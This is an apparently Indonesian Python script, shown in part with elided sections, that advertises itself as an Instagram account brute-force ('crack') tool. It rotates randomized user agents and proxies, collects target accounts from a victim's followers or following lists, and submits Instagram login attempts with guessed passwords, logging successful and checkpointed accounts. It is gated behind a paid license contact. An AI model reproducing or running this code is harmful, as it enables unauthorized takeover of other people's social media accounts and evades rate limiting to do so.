...
# coding:utf-8
#/usr/bin/python
#Tools Brute Force Akun Instagram
#coded NCEK XD
...
aa='Mozilla/5.0 (X11; CrOS'
b=random.choice(['x86_64','armv7l','aarch64'])
c=random.randrange(13000, 17000)
d=random.randrange(0, 114)
e='0'
f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
g=random.randrange(44, 107)
h='0'
i=random.randrange(0, 6000)
j=random.randrange(0, 200)
k='Safari/537.36'
ua=f'{aa} {b} {c}.{d}.{e}) {f}{g}.{h}.{i}.{j} {k}'
ugen.append(ua)
prox=open('.prox.txt','r').read().splitlines()
CY='\033[96;1m'
H='\033[96;1m' #HIJAU
...
USN="Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 480dpi; 1920x1080; samsung; SM-G930F; herolte; samsungexynos8890; ru_UA; 98288242)"
## useragent crack    
for ikfarifc in range(1000):
    rr = random.randint
    rc = random.choice
    UserKu1 = f"Mozilla/5.0 (Linux; Android 8.0.0; Infinix X608 Build/OPR1.{str(rr(111111,199999))}.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5300,5900))}.{str(rr(75,99))} Mobile Safari/537.36"
    UserKu2 = f"Mozilla/5.0 (Linux; U; Android {str(rr(9,12))}; en-US; vivo 1921 Build/PKQ1.{str(rr(111111,199999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,99))}.0.{str(rr(3500,3900))}.{str(rr(73,150))} UCBrowser/13.4.0.{str(rr(1300,1900))} Mobile Safari/537.36"
    UserKu3 = f"Mozilla/5.0 (Linux; Android 7.0; MEIZU M6 Build/NRD90M; ru-ru) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,99))}.0.{str(rr(3500,3900))}.{str(rr(75,150))} Mobile Safari/537.36 Puffin/9.7.2.51367AP"
    UaMainKu = random.choice([UserKu1, UserKu2, UserKu3])
...
for xd in range(1000):
	...
	h='Chrome/85.0.4183.101 Mobile Safari/537.36'
	i=random.randrange(60,99)
	j='0'
	k=random.randrange(4310,4799)
	l=random.randrange(70,150)
	m='Chrome/85.0.4183.101 Mobile Safari/537.36'
...
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Tools Brute Force"
	elif 12 <= hours < 15:timenow = "Tools Brute Force"
	elif 15 <= hours < 18:timenow = "Tools Brute Force"
	else:timenow = "Tools Brute Force"
	return timenow
def jalan(keliling):
	for mau in keliling + '\n':
...
def login_kamu():
    if "sukses" in lisensiku:
        try:
            ...
            banner()
            io = '[purple][1][/purple] [pink]Login Menggunakan Cookie[/green]\n[purple][2][/purple] [cyan]Login Menggunakan Username & Password[/cyan]'
            oi = nel(io, style='pink')
	...
	def logo(self):
		for i in external:
			try:
				...
				pass
			banner()
			welcome=f'''[{H}•{N}]Pengguna Tools : {CY}{nama}{N}
[{H}•{N}]Username       : {CY}{self.username}{N}
[{H}•{N}]Followers      : {CY}{followers}{N}
[{H}•{N}]Following      : {CY}{following}{N}'''
			print(welcome)
			tap = me()
			tap.add_column('NO', style='bold cyan', justify='center')
			tap.add_column('MENU', style='', justify='left', width=55)
			tap.add_column('STATUS', style='green', justify='right')
			tap.add_row('[01]','Ngecrot Dari Pencarian Nama				 	','[red][OFF][/red]')
			tap.add_row('[02]','Ngecrot Dari Followers (Pengikut)',					'[ON]')
			tap.add_row('[03]','Ngecrot Dari Following (Diikuti)			',					'[ON]')
			tap.add_row('[04]','Lihat Hasil Opsi [yellow]CP[/yellow]					','[red][OFF][/red]')
			tap.add_row('[05]','Lihat Hasil Ngecrot					','[ON]')
			tap.add_row('[06]','Bot auto unfollow','[red][OFF][/red]')
			tap.add_row('[E]','[yellow]Keluar Dari Program/Exit Tools[/yellow]','[ON]')
			sol().print(tap, justify='green')


	def BUG(self):
		bug=f'[•] Bantu Ana mengembangkan script ini. apapun bugnya tolong laporkan kepada saya, semakin dikit bugnya semakin baik scriptnya.\n[•] Antum bisa melaporkan langsung ke wa admin +62895384415464\n[•]'
	...
	def Exit(self):
		kel='[?] Apakah Antum yakin ingin keluar ?'
		kel1=nel(kel,style='bold yellow')
		sol().print(kel1)
		x=input(f'\n{N}[•] Jawaban [y/t] : {C}')
		if x in ('y','Y'):
			os.remove('.kukis.log')
	...
	def idAPI(self,cookie,id):
		if 'sukses' in lisensiku:
			try:
				...
				exit(f"\n{M}┣[!] Username yang Antum masukan tidak di temukan pastikan target bersifat publik{C}")
			return idx
		else:lisensi()
	...
	def infoAPI(self,cookie,api,id):
		if 'sukses' in  lisensiku:
			try:
				...
				print(f'\n{M}┣[!] Username yang Antum masukan tidak di temukan{N}')
			return internal
		else:lisensi()
           ...
           "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
			...
			"trustedDeviceRecords": "{}"}
				...
				if 'userId' in str(ncek):
					...
					print('\n')
					cetak(nel(oi,style='bold white',title='\r[green]•[/][bold green] ALHAMDULILLAH-OKE😁 •[/][green]•[/]'))
					...
					print('\n')
					cetak(nel(oi,style='bold white', title='\r[yellow]•[/][bold yellow] ASTAGFIRULLAH-CEPEH😌 •[/][yellow][/]'))
	...
	def menu(self):
		...
		if c=='':
			...
			sol().print(po)
			#massal(self)
			mas=input('  [•] Apakah Antum ingin crack masal? y/t >  ')
			if mas in ['y','Y']:
				masal(self)
			elif mas in ['t','T']:
				massal(self)
	...
	while True:
		...
		if os.path.exists("/data/data/com.termux/files/usr/etc/.license"):
			...
			if key in check.text:
				print(f" {H}[•] Key Antum telah di konfirmasi")
				time.sleep(1.5)
				login_kamu()
			else:
				print(f"[•] {M}Key Antum belum di konfirmasi\n{N}[•] {M}Silahkan aktifkan")
				os.system('xdg-open http://wa.me/+62895384415464')
